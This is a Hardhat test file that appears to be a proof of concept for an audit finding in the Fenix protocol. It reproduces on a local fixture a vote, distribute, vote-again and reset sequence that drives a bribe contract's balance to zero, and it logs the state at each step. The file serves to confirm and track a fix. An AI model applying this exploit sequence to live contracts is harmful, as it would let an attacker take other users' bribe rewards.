import { abi as POOL_ABI } from '@cryptoalgebra/integral-core/artifacts/contracts/AlgebraPool.sol/AlgebraPool.json';
import { encodePriceSqrt } from '@cryptoalgebra/integral-core/test/shared/utilities';
import { AlgebraPool } from '@cryptoalgebra/integral-core/typechain';
import { HardhatEthersSigner } from '@nomicfoundation/hardhat-ethers/signers';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { time } from '@nomicfoundation/hardhat-toolbox/network-helpers';
import { expect } from 'chai';
import { ethers } from 'hardhat';
import { ERC20Mock, Fenix, Pair } from '../../typechain-types';
import { ZERO } from '../utils/constants';
import completeFixture, { CoreFixtureDeployed, FactoryFixture, deployAlgebraCore, deployERC20MockToken } from '../utils/coreFixture';

describe('#2 Adversary can steal all bribe rewards', function () {
  let deployed: CoreFixtureDeployed;
  let signers: {
    deployer: HardhatEthersSigner;
    blastGovernor: HardhatEthersSigner;
    fenixTeam: HardhatEthersSigner;
    proxyAdmin: HardhatEthersSigner;
    otherUser1: HardhatEthersSigner;
    otherUser2: HardhatEthersSigner;
    otherUser3: HardhatEthersSigner;
    otherUser4: HardhatEthersSigner;
    otherUser5: HardhatEthersSigner;
  };
  let tokenTK18: ERC20Mock;
  let tokenTK6: ERC20Mock;
  let fenix: Fenix;
  let algebraCore: FactoryFixture;
  let poolV2FenixTk18: Pair;
  let poolV3FenixTk18: AlgebraPool;
  let user1TokenId: bigint;
  let user2TokenId: bigint;

  before('deployed', async () => {
    deployed = await loadFixture(completeFixture);
    fenix = deployed.fenix;

    algebraCore = await deployAlgebraCore(await deployed.blastPoints.getAddress());
    signers = deployed.signers;

    tokenTK18 = await deployERC20MockToken(deployed.signers.deployer, 'TK18', 'TK18', 18);
    tokenTK6 = await deployERC20MockToken(deployed.signers.deployer, 'TK6', 'TK6', 6);

    await deployed.feesVaultFactory.grantRole(await deployed.feesVaultFactory.WHITELISTED_CREATOR_ROLE(), algebraCore.factory.target);

    await algebraCore.factory.setVaultFactory(deployed.feesVaultFactory.target);

    await algebraCore.factory.grantRole(await algebraCore.factory.POOLS_CREATOR_ROLE(), signers.deployer.address);
  });

  it('Check state after deployed', async () => {
    expect(await fenix.totalSupply()).to.be.eq(ethers.parseEther('7500000'));
    expect(await deployed.v2PairFactory.communityVaultFactory()).to.be.eq(await deployed.feesVaultFactory.target);
    expect(await algebraCore.factory.vaultFactory()).to.be.eq(await deployed.feesVaultFactory.target);
  });

  it('Correct create new pairs in v2 & v3 factory before first epoch', async () => {
    await deployed.v2PairFactory.createPair(deployed.fenix.target, tokenTK18.target, true);
    await deployed.v2PairFactory.createPair(deployed.fenix.target, tokenTK6.target, false);

    poolV2FenixTk18 = await ethers.getContractAt(
      'Pair',
      await deployed.v2PairFactory.getPair(deployed.fenix.target, tokenTK18.target, true),
    );
    await algebraCore.factory.createPool(deployed.fenix.target, tokenTK18.target);

    poolV3FenixTk18 = (await ethers.getContractAt(
      POOL_ABI,
      await algebraCore.factory.poolByPair(deployed.fenix.target, tokenTK18.target),
    )) as any as AlgebraPool;

    await poolV3FenixTk18.initialize(encodePriceSqrt(1, 1));
  });

  it(`Adversary can steal all bribe rewards`, async () => {
    let res = await deployed.voter.connect(signers.deployer).createV2Gauge.staticCall(poolV2FenixTk18.target);

    await deployed.voter.connect(signers.deployer).createV2Gauge(poolV2FenixTk18.target);

    await fenix.approve(deployed.votingEscrow.target, ethers.parseEther('200'));
    await deployed.votingEscrow.create_lock_for(1e9, 182 * 86400, signers.deployer.address);
    user1TokenId = await deployed.votingEscrow.lastMintedTokenId();

    await deployed.votingEscrow.create_lock_for(ethers.parseEther('10'), 182 * 86400, signers.deployer.address);
    user2TokenId = await deployed.votingEscrow.lastMintedTokenId();

    console.log('user voter power, nft 1', await deployed.votingEscrow.balanceOfNFT(user1TokenId));
    console.log('user voter power, nft 2', await deployed.votingEscrow.balanceOfNFT(user2TokenId));
    console.log(
      'deployed.voter.votes(user1TokenId, poolV2FenixTk18.target)',
      await deployed.voter.votes(user1TokenId, poolV2FenixTk18.target),
    );
    console.log(
      'deployed.voter.votes(user2TokenId, poolV2FenixTk18.target)',
      await deployed.voter.votes(user2TokenId, poolV2FenixTk18.target),
    );
    let bribe = await ethers.getContractAt('BribeUpgradeable', res.internalBribe);

    console.log('Balance Before vote user1TokenId', await bribe.totalSupply());

    await deployed.voter.vote(user1TokenId, [poolV2FenixTk18.target], [10000]);
    console.log('Balance After vote user1TokenId', await bribe.totalSupply());

    console.log(
      'await deployed.voter.votes(user1TokenId, poolV2FenixTk18.target)',
      await deployed.voter.votes(user1TokenId, poolV2FenixTk18.target),
    );
    console.log(
      'await deployed.voter.votes(user2TokenId, poolV2FenixTk18.target)',
      await deployed.voter.votes(user2TokenId, poolV2FenixTk18.target),
    );

    await time.increase(8 * 86400);
    await deployed.voter.distributeAll();

    console.log('Balance After one week', await bribe.totalSupply());

    console.log(
      'await deployed.voter.votes(user1TokenId, poolV2FenixTk18.target)',
      await deployed.voter.votes(user1TokenId, poolV2FenixTk18.target),
    );
    console.log(
      'await deployed.voter.votes(user2TokenId, poolV2FenixTk18.target)',
      await deployed.voter.votes(user2TokenId, poolV2FenixTk18.target),
    );

    console.log('voted user2TokenId');

    await deployed.voter.vote(user2TokenId, [poolV2FenixTk18.target], [10000]);

    console.log(
      'await deployed.voter.votes(user1TokenId, poolV2FenixTk18.target)',
      await deployed.voter.votes(user1TokenId, poolV2FenixTk18.target),
    );
    console.log(
      'await deployed.voter.votes(user2TokenId, poolV2FenixTk18.target)',
      await deployed.voter.votes(user2TokenId, poolV2FenixTk18.target),
    );

    console.log('Balance Before', await bribe.totalSupply());

    await deployed.voter.reset(user1TokenId);
    console.log('Balance after reset nft token 1 ', await bribe.totalSupply());

    await deployed.voter.reset(user2TokenId);
    console.log('Balance after reset second nft token', await bribe.totalSupply());
    console.log(
      'await deployed.voter.votes(user1TokenId, poolV2FenixTk18.target)',
      await deployed.voter.votes(user1TokenId, poolV2FenixTk18.target),
    );
    console.log(
      'await deployed.voter.votes(user2TokenId, poolV2FenixTk18.target)',
      await deployed.voter.votes(user2TokenId, poolV2FenixTk18.target),
    );

    expect(await bribe.totalSupply(), 'NOT_FIXED').to.be.eq(ZERO);
  });
});
